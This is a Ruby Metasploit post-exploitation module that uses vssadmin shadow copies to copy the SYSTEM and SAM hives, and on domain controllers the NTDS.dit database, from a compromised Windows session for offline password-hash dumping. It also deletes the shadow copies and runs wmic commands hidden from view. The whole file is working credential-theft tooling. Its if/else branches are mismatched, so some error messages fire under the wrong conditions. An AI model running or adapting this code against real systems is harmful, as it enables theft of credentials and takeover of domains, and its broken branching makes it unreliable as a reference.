require 'msf/core'
require 'rex'

# Multi platform requiere
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
#require 'msf/core/post/windows/accounts'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::Registry
	#include Msf::Post::Windows::Accounts

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Post Windows Gather SAM Files Module',
				'Description'   => %q{
					Post Module that uses the volume shadow service to be able to get the SYSTEM,
					SAM and in the case of Domain Controllers the NTDS files for offline hash dumping.
				},
				'License'       => BSD_LICENSE,
				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'windows' ], 
				'SessionTypes'  => [ 'meterpreter' ]
			))
	end

	# Run Method for when run command is issued
	def run
		# syinfo is only on meterpreter sessions
		print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
		if is_admin?
			if sysinfo['OS'] !~ /Windows 7|Vista|XP/
				sysdrv = client.fs.file.expand_path("%SystemDrive%")
				loot_path = Msf::Config.loot_directory
				cmd = "vssadmin create shadow /for=#{sysdrv.strip}"
				print_status("Creating volume shadow copy for drive #{sysdrv}")
				puts cmd
				cmd_results = cmd_exec(cmd,nil,15)
				if cmd_results =~ /Successfully/
					print_good("Creation of volume shadow successful")
					vs_path = cmd_results.scan(/Shadow Copy Volume Name: (\S*)/)[0].join

					# System Hive
					print_status("Downloading SYSTEM hive")
					sys_file = ::File.join(loot_path,"system_#{::Time.now.strftime("%Y%m%d.%M%S")}")
					session.fs.file.download_file(sys_file, "#{vs_path}\\WINDOWS\\system32\\config\\system")
					print_good("System file downloaded as #{sys_file}")
					store_loot("windows.system",
						"registry/hive",
						session, ::File.read(sys_file, ::File.size(sys_file)),
						"system",
						"Windows SYSTEM Hive")

					# Sam hive
					print_status("Downloading SAM hive")
					sam_file = ::File.join(loot_path,"sam_#{::Time.now.strftime("%Y%m%d.%M%S")}")
					session.fs.file.download_file(sam_file, "#{vs_path}\\WINDOWS\\system32\\config\\SAM")
					print_good("SAM file downloaded as #{sam_file}")
					store_loot("windows.sam",
						"registry/hive",
						session,
						::File.read(sam_file, ::File.size(sam_file)),
						"sam",
						"Windows SAM Hive")

					# NTDS database
					if is_dc?
						print_status("This is a Domain Controller")
						print_status("Downloading NTDS file")
						ntds_file = ::File.join(loot_path,"ntds_#{::Time.now.strftime("%Y%m%d.%M%S")}")
						session.fs.file.download_file(ntds_file, "#{vs_path}\\WINDOWS\\NTDS\\ntds.dit")
						print_good("NTDS file downloaded as #{ntds_file}")
						store_loot("windows.ntds",
							"registry/hive",
							session,
							::File.read(ntds_file, ::File.size(ntds_file)),
							"ntds.dit",
							"Windows DC NTDS DB")
					end

					# Cleanup
					print_status("Removing Shadow Copies")
					cmd_results = session.shell_command_token("vssadmin delete shadows",15)
					print_status("Saving in to loot")
				else
					print_error("This version of Windows is not supported at the momment.")
				end
			else
				print_error("You need to be Administrator to be able to create a volume shadow copy.")
			end
		else
			print_error("Volume Shadow copy for #{sysdrv} could not be made")
			cmd_results.each_line do |l|
				print_error("\t#{l.strip}")
			end
		end

	end

	# Function for checking if target is a DC
	def is_dc?
		is_dc_srv = false
		serviceskey = "HKLM\\SYSTEM\\CurrentControlSet\\Services"
		if registry_enumkeys(serviceskey).include?("NTDS")
			if registry_enumkeys(serviceskey + "\\NTDS").include?("Parameters")
				is_dc_srv = true
			end
		end
		return is_dc_srv
	end

	def wmicexec(wmiccmd)
		tmpout = ''
		session.response_timeout=120
		begin
			tmp = session.fs.file.expand_path("%TEMP%")
			wmicfl = tmp + "\\"+ sprintf("%.5d",rand(100000))
			print_status "running command wmic #{wmiccmd}"
			r = session.sys.process.execute("cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe /append:#{wmicfl} #{wmiccmd}", nil, {'Hidden' => true})
			sleep(2)
			#Making sure that wmic finishes before executing next wmic command
			prog2check = "wmic.exe"
			found = 0
			while found == 0
				session.sys.process.get_processes().each do |x|
					found =1
					if prog2check == (x['name'].downcase)
						sleep(0.5)
						found = 0
					end
				end
			end
			r.close

			# Read the output file of the wmic commands
			wmioutfile = session.fs.file.new(wmicfl, "rb")
			until wmioutfile.eof?
				tmpout << wmioutfile.read
			end
			wmioutfile.close
		rescue ::Exception => e
			print_status("Error running WMIC commands: #{e.class} #{e}")
		end
		# We delete the file with the wmic command output.
		c = session.sys.process.execute("cmd.exe /c del #{wmicfl}", nil, {'Hidden' => true})
		c.close
		return tmpout
	end
end